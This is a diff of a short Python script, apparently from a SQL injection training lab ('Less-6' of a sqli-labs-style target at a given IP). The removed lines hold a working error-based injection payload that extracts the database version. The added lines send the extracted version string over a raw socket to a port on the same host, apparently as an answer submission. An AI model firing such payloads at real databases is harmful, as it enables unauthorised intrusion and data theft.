@@ -1,15 +1,27 @@
-import requests
+import socket
+from urllib.parse import urlparse
 
-# Set the target URL and the payload that caused the error
-url = "http://43.136.237.143:40030/Less-6/"
-pre = '1"'
 
-# SQL injection payload to retrieve the database version
-sql_payload = pre + 'union select updatexml(1,concat(0x7e,(select@@version),0x7e),1); --+'
+def default_action_fun(url, flag=''):
+    parsed_url = urlparse(url)
+    host = parsed_url.hostname
+    port = 40050
+    message = str(parsed_url.port) + ', ' + flag
 
-# Send the request with the SQL injection payload
-response = requests.get(url+'?id='+sql_payload)
-response.raise_for_status()  # Raise an error if the request failed
+    # 创建套接字
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Output the response content
-print(response.text)
+    try:
+        # 连接到服务器
+        client_socket.connect((host, port))
+        # 发送消息
+        client_socket.sendall(message.encode())
+        # 接收响应
+        response = client_socket.recv(1024).decode()
+        # 打印响应
+        return response
+    finally:
+        client_socket.close()
+
+res = default_action_fun('http://43.136.237.143:40030/Less-6/', '10.2.26-MariaDB-log')
+print(res)
